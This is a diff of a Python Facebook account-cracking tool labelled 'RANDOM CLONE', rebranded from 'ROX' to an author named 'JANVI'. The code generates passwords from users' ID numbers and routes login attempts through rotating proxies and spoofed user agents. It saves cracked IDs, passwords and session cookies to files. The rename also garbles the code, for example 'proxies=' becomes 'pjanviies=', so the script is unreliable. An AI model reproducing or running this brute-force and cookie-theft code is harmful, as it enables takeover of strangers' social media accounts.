@@ -67,15 +67,15 @@ today=today_data[2]+"~"+month.get(today_data[1])
 
 
 try:
-    rx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text.splitlines()
+    rx=requests.get("https://api.pjanviyscrape.com/?request=displaypjanviies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text.splitlines()
 except:
     sys.exit(" Internet Error ")
 #__________________| LOGO - DEF |__________________#    
 logo=f"""  
-[red]     88888    db    88b 88 Yb    dP 88 [red]X
-[green]      88   dPYb   88Yb88  Yb  dP  88 
-[purple] o.  88  dP__Yb  88 Y88   YbdP   88 
-[green]  "bodP' dP""""Yb 88  Y8    YP    88 [red]D
+     [white]88888    db    88b 88 Yb    dP 88 [red]X
+     [green]   88   dPYb   88Yb88  Yb  dP  88   
+    [white]o.  88  dP__Yb  88 Y88   YbdP   88  
+    [green]"bodP' dP""""Yb 88  Y8    YP    88[red]D
 [red]{str('━'*38)}
 [white][[green]-[white]][green] AUTHOR   :  JANVI KUMARI
 [white][[green]-[white]][green] STATUS   :  RANDOM CLONE
@@ -171,7 +171,7 @@ def filll():
     me.clear()
     pwx=[]
     print(logo)
-    print(" [bright_white]~/ EXAMPLE : /sdcard/rox.txt")
+    print(" [bright_white]~/ EXAMPLE : /sdcard/janvi.txt")
     flpa=str(input(" ~/ CHOICE : "))
     print(Heron.line())
     try:
@@ -217,7 +217,7 @@ def filll():
         except:pass
     print("\r\r"+Heron.line())
     print(f" [bright_white]~/ TOTAL OK : {str(len(oks))}")
-    print(f" [bright_white]~/ ID SAVE  :  /sdcard/ROX-F-OK.txt ")
+    print(f" [bright_white]~/ ID SAVE  :  /sdcard/JANVI-F-OK.txt ")
     print(Heron.line())
     sys.exit()
 
@@ -277,7 +277,7 @@ def filex(uid,pwx,name,meth,fl):
     else:
         uax="Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/th_TH;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]"
 #__________________| FILE METHOD |__________________#
-    sys.stdout.write(f'\r \033[0;37m [{random.choice(color)}ROX-M{meth}\033[0;37m]-\033[0;37m[{random.choice(color)}{loop}|{str(len(fl))}\033[0;37m]-\033[0;37m\033[1;32m[{str(len(oks))}]\033[1;37m\r');sys.stdout.flush()
+    sys.stdout.write(f'\r \033[0;37m [{random.choice(color)}JANVI-M{meth}\033[0;37m]-\033[0;37m[{random.choice(color)}{loop}|{str(len(fl))}\033[0;37m]-\033[0;37m\033[1;32m[{str(len(oks))}]\033[1;37m\r');sys.stdout.flush()
     
     First=name.split(" ")[0]
     try:
@@ -354,14 +354,14 @@ def filex(uid,pwx,name,meth,fl):
             rq=requests.post(url,data=data,headers=head,allow_redirects=False, verify=certifi.where()).json()
             if "session_key" in rq:
                 coki=";".join(i["name"]+"="+i["value"] for i in rq["session_cookies"])
-                print(f'\r\r\033[1;32m[ROX]-[OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
-                open('/sdcard/ROX-F-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
+                print(f'\r\r\033[1;32m[JANVI]-[OK]\033[1;32m '+ids+f'\033[1;32m |\033[1;32m '+pas+'')
+                open('/sdcard/JANVI-F-COOKIE.txt', 'a').write(ids+'|'+pas+'|'+coki+"\n")
                 oks.append(id)
                 break
             elif "Please Confirm Email" in str(rq):
                 
-        #.         print(f"\r\r[b r green_yellow][ROX-CP][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
-                open("/sdcard/ROX-RND-CPtxt","a").write(uid+"|"+ps+"|"+"\n")
+        #.         print(f"\r\r[b r green_yellow][JANVI-CP][/b r green_yellow][b chartreuse1]{uid}|{ps}\n")
+                open("/sdcard/JANVI-RND-CPtxt","a").write(uid+"|"+ps+"|"+"\n")
                 oks.append(id)
                 break
             
@@ -536,7 +536,8 @@ def old():
 def uoa():
     ver=str(random.choice(range(77,500)))
     ver2=str(random.choice(range(57,77)))
-    return f"Mozilla/5.0 (Linux; Android 9; FIG-LX1 Build/HUAWEIFIG-L11; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ver} {ver2} Mobile Safari/537.36"
+    ver3=str(random.choice(range(0,15)))
+    return f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_{ver3}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.{ver2} Safari/537.36"
 
 
 def loginxo(uid,user):
@@ -571,7 +572,7 @@ def loginxo(uid,user):
                 break 
             elif "Please Confirm Email" in str(rp):
                 oks.append(uid)
-                print(f"\r\r[reverse white][ROX-OK][/reverse white] [pale_green1]{uid} [white]|[/white][bright_red] {pw}   ")
+                print(f"\r\r[reverse white][JANVI-OK][/reverse white] [pale_green1]{uid} [white]|[/white][bright_red] {pw}   ")
                 open("/sdcard/OLD.txt","a").write(uid+"|"+pw+"\n")
                 ok_call()
                 break
@@ -666,12 +667,12 @@ def ran():
 #----------------------------[ RND-MTD ] --------------------------#
 def rensub(uid,pwx,meth,fb,user):
     global oks,loop
-    sys.stdout.write(f'\r•\033[0;37m[{random.choice(color)}ROX-M{meth.upper()}\033[0;37m]-[\033[1;32m{loop}\033[1;91m|\033[0;37m{str(len(user))}\033[0;37m]-[\033[1;32mOK:{str(len(oks))}\033[0;37m]\r');sys.stdout.flush()
+    sys.stdout.write(f'\r•\033[0;37m[{random.choice(color)}JANVI-M{meth.upper()}\033[0;37m]-[\033[1;32m{loop}\033[1;91m|\033[0;37m{str(len(user))}\033[0;37m]-[\033[1;32mOK:{str(len(oks))}\033[0;37m]\r');sys.stdout.flush()
     
     try:
         for pw in pwx:
             session=requests.Session()
-            proxs= {'http': 'socks4://'+random.choice(rx)}
+            pjanvis= {'http': 'socks4://'+random.choice(rx)}
             ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
             free_fb = session.get(f'https://{fb}.facebook.com').text
             data={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
@@ -701,14 +702,14 @@ def rensub(uid,pwx,meth,fb,user):
 'referer': f'https://{fb}.facebook.com/',
 'accept-encoding': 'gzip, deflate, br',
 'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
-            session.post(f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,headers=header,proxies=proxs)
+            session.post(f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,headers=header,pjanviies=pjanvis)
             res=session.cookies.get_dict().keys()
             if "c_user" in res:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 xx=coki.split("c_user=")[1]
                 xd=xx[:15].replace(";","  ") 
-                print(f"\r\r[white][[green]ROX-OK[white]][green] {xd}[red] • [green]{ps}")
-                open("/sdcard/ROX-R-COOKIE.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
+                print(f"\r\r[white][[green]JANVI-OK[white]][green] {xd}[red] • [green]{ps}")
+                open("/sdcard/JANVI-R-COOKIE.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                 oks.append(xd)
                 break
             else:continue
